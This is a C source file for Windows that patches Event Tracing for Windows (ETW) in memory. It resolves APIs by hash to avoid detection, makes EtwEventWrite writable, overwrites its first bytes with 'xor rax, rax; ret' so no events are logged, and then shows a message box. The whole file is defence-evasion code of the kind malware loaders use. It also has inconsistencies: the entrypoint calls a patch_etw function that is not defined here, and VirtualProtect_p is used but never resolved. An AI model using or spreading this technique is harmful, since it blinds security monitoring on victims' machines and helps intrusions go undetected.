#include <windows.h>

#include "objhash.h"
#include "entrypoint.h"

int DisableETW(void) {
    HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH); // Load Ntdll module
    
    VirtualProtectEx_t _ProtectVirtMem = (VirtualProtectEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_PROTECT_HASH);
    FlushInstructionCache_t _FlushInstructionCache = (FlushInstructionCache_t)CustomGetProcAddress(hKernel32dll, FLUSH_INSTRUCTION_CACHE_HASH);
    EtwEventWrite_t _EtwEventWrite = (EtwEventWrite_t)CustomGetProcAddress(hNtdll, ETW_EVENT_WRITE_HASH);

	DWORD oldprotect = 0;

	_ProtectVirtMem((HANDLE)-1,_EtwEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

	memcpy(_EtwEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret


	VirtualProtect_p(_EtwEventWrite, 4096, oldprotect, &oldprotect);
	_FlushInstructionCache(-1, _EtwEventWrite, 4096);
	return 0;
}

void entrypoint() {
    // ETW Patching to test in sandbox
    patch_etw();

    MessageBoxA(NULL, "ETW Patching applied", "Info", MB_OK);
}